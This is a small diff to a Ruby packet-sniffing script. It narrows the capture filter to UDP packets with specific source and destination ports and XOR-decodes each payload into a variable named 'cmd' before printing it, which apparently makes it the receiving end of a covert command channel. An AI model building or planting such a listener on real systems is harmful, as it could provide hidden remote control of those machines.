@@ -27,10 +27,10 @@ iface = ARGV[0] || "em1"
 
 # Opens up the nic for capture.
 def sniff(iface)
-  cap = Capture.new(:iface => iface, :start => true, :filter => 'port 22')
+  cap = Capture.new(:iface => iface, :start => true, :filter => 'udp and dst port 8080 and src port 11234')
   cap.stream.each do |p|
     packet = Packet.parse p
-    #pp packet
+    pp packet
     cmd = xor packet.payload
     pp cmd
     pp packet.payload
